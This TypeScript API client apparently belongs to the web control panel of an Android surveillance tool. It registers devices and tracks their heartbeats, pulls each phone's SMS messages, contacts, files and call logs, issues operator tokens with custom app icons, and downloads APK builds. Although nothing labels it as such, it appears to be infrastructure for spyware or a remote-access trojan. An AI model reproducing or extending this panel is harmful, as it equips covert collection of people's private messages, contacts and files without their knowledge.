import axios from "axios";
import { useAuthStore } from "@/store/authStore";
import type {
  LoginResponse,
  Device,
  DevicesResponse,
  DeviceStats,
  Admin,
  TokenUser,
  AdminStats,
  Token,
} from "@/types";

const api = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000/api",
  timeout: 10000,
  headers: { "Content-Type": "application/json" },
});

api.interceptors.request.use((config) => {
  const token = useAuthStore.getState().token;
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      useAuthStore.getState().logout();
    }
    return Promise.reject(error);
  }
);

export const authApi = {
  login: async (email: string, password: string): Promise<LoginResponse> => {
    const { data } = await api.post("/auth/login", { email, password });
    return data;
  },
  tokenLogin: async (token: string): Promise<LoginResponse> => {
    const { data } = await api.post("/auth/token-login", { token });
    return data;
  },
  verify: async (): Promise<{ auth: Admin | TokenUser; valid: boolean }> => {
    const { data } = await api.get("/auth/verify");
    return data;
  },
};

export const deviceApi = {
  getAll: async (params?: {
    search?: string;
    status?: string;
    sortBy?: string;
    sortOrder?: string;
    page?: number;
    limit?: number;
  }): Promise<DevicesResponse> => {
    const { data } = await api.get("/devices", { params });
    return data;
  },
  getById: async (id: string): Promise<{ device: Device }> => {
    const { data } = await api.get(`/device/${id}`);
    return data;
  },
  delete: async (id: string): Promise<void> => {
    await api.delete(`/device/${id}`);
  },
  getStats: async (): Promise<DeviceStats> => {
    const { data } = await api.get("/devices/stats");
    return data;
  },
  register: async (deviceData: {
    deviceId: string;
    deviceName: string;
    androidVersion?: string;
    appVersion?: string;
    token?: string;
  }): Promise<{ device: Device; isNew: boolean }> => {
    const { data } = await api.post("/device/register", deviceData);
    return data;
  },
  heartbeat: async (
    deviceId: string
  ): Promise<{ device: Device }> => {
    const { data } = await api.post("/device/heartbeat", { deviceId });
    return data;
  },
  getSms: async (deviceId: string): Promise<{ sms: any[] }> => {
    const { data } = await api.get(`/devices/${deviceId}/sms`);
    return data;
  },
  getContacts: async (deviceId: string): Promise<{ contacts: any[] }> => {
    const { data } = await api.get(`/devices/${deviceId}/contacts`);
    return data;
  },
  getFiles: async (deviceId: string): Promise<{ files: any[] }> => {
    const { data } = await api.get(`/devices/${deviceId}/files`);
    return data;
  },
  getCallLogs: async (deviceId: string): Promise<{ callLogs: any[] }> => {
    const { data } = await api.get(`/devices/${deviceId}/call-logs`);
    return data;
  },
};

export const tokenApi = {
  getAll: async (): Promise<{ tokens: Token[] }> => {
    const { data } = await api.get("/admin/tokens");
    return data;
  },
  create: async (name: string): Promise<{ token: Token }> => {
    const { data } = await api.post("/admin/tokens", { name });
    return data;
  },
  toggleActive: async (id: string): Promise<{ token: Token }> => {
    const { data } = await api.patch(`/admin/tokens/${id}/toggle`);
    return data;
  },
  delete: async (id: string): Promise<void> => {
    await api.delete(`/admin/tokens/${id}`);
  },
  uploadIcon: async (id: string, base64: string): Promise<{ iconUrl: string }> => {
    const { data } = await api.post(`/admin/tokens/${id}/icon`, { icon: base64 });
    return data;
  },
  deleteIcon: async (id: string): Promise<void> => {
    await api.delete(`/admin/tokens/${id}/icon`);
  },
};

export const userApi = {
  uploadIcon: async (base64: string): Promise<{ iconUrl: string }> => {
    const { data } = await api.post("/user/icon", { icon: base64 });
    return data;
  },
  deleteIcon: async (): Promise<void> => {
    await api.delete("/user/icon");
  },
};

export const adminApi = {
  getStats: async (): Promise<AdminStats> => {
    const { data } = await api.get("/admin/stats");
    return data;
  },
};

export async function streamSSE(
  url: string,
  token: string,
  onMessage: (data: string) => void,
  onError: (err: Error) => void,
  signal?: AbortSignal
) {
  try {
    const res = await fetch(url, {
      headers: { Authorization: `Bearer ${token}` },
      signal,
    });
    if (!res.ok) {
      onError(new Error(`SSE connection failed: ${res.statusText}`));
      return;
    }
    const reader = res.body?.getReader();
    if (!reader) {
      onError(new Error('No response body'));
      return;
    }
    const decoder = new TextDecoder();
    let buffer = "";
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split("\n");
      buffer = lines.pop() || "";
      for (const line of lines) {
        if (line.startsWith("data: ")) {
          onMessage(line.slice(6));
        }
      }
    }
  } catch (err: any) {
    if (err.name !== "AbortError") {
      onError(err);
    }
  }
}

export async function downloadApk(url: string, filename: string) {
  const token = useAuthStore.getState().token;
  const res = await fetch(url, { headers: token ? { Authorization: `Bearer ${token}` } : {} });
  if (!res.ok) throw new Error(`Download failed: ${res.statusText}`);
  const blob = await res.blob();
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(a.href);
}

export default api;
